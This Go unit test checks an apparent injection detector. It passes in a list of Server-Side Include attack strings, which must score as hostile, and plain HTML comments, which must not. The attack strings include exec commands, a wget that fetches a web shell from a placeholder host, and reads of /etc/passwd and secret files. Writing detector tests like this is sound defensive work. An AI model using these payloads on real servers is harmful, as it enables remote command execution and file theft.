package ssti

import "testing"

func TestSSI(t *testing.T) {
	attacks := []string{
		`<!--#exec cmd="ls" -->`,
		`<!--#exec cmd="dir" -->`,
		`<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->`,
		`<!-- #exec cmd="id" -->`,
		`<!--#include virtual="/etc/passwd" -->`,
		`<!--#include file="../../secret" -->`,
		`<!--#EXEC cmd='id'-->`,
		`<!--#printenv -->`,
	}
	for _, a := range attacks {
		sum := 0
		for _, f := range Detect(a, "query") {
			sum += f.Score
		}
		if sum < 50 {
			t.Errorf("Detect(%q) score = %d, want >= 50", a, sum)
		}
	}
	for _, b := range []string{
		"<!-- a plain html comment -->",
		"<!-- TODO: execute later -->",
		"<!-- #1 priority -->",
		"issue #exec is documented",
		"<!--[if IE]> legacy <![endif]-->",
	} {
		for _, f := range Detect(b, "body") {
			if f.Score >= 50 {
				t.Errorf("Detect(%q) scored %d (%s), want < 50", b, f.Score, f.Description)
			}
		}
	}
}
